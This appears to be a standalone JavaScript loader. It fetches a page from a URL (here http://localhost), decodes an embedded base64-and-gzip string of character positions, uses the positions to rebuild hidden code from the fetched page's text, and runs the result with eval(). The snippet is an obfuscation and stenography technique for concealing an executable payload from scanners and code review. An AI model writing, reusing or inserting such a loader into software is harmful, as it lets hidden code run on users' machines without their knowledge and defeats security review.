function loadXMLDoc(theURL) {
  if (window.XMLHttpRequest) {
    xmlhttp=new XMLHttpRequest();
  } else {
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
  xmlhttp.open("GET", theURL, false);
  xmlhttp.send();
}


var base_chars = ["0", "1", "2", "3",
                   "4", "5", "6", "7",
                   "8", "9", "a", "b",
                   "c", "d", "e", "f"];

var charset = [97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108,
        109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121,
        122, 123];
var file = "http://localhost"
var b = "eJxNjcsRwEAIQhviEPHXf2eJrDuTCwP4VDbMwUbUKAuesBhlyNQvinSRldp6Zmpcz3st1ZgY72W+ePjT7CNhwRcVtRo+";

var decodedStr = atob(b);
var unziped = pako.ungzip(decodedStr, { to: 'string' })
var pattern = unziped.split(",");
var xmlhttp=false;
loadXMLDoc(file);
if(xmlhttp==true){ /* set timeout or alert() */ }
else {
  var i = 1;
  var map = {};
  var filedata = xmlhttp.responseText;
  filedata = filedata.replace(/[^\x00-\x7F]/g, "");
  base_chars.forEach(element => {
    for (i; i < filedata.length; i++) {
      var c = filedata.charAt(i);
      var x = c.charCodeAt(0);
      if (charset.indexOf(x)<0) {
        continue;
      }
      map[element] = i;
      charset.splice(charset.indexOf(x), 1);
      break;
    }
    i++;

  });

  var data_hex = "";
  pattern.forEach(p => {
    Object.keys(map).forEach(function(key) {
      if (map[key] == p) {
        data_hex += key;
        return;
      }
    });
  });
  var data = '';
  for (var n = 0; n < data_hex.length; n += 2)
          data += String.fromCharCode(parseInt(data_hex.substr(n, 2), 16));
  eval(data);
}
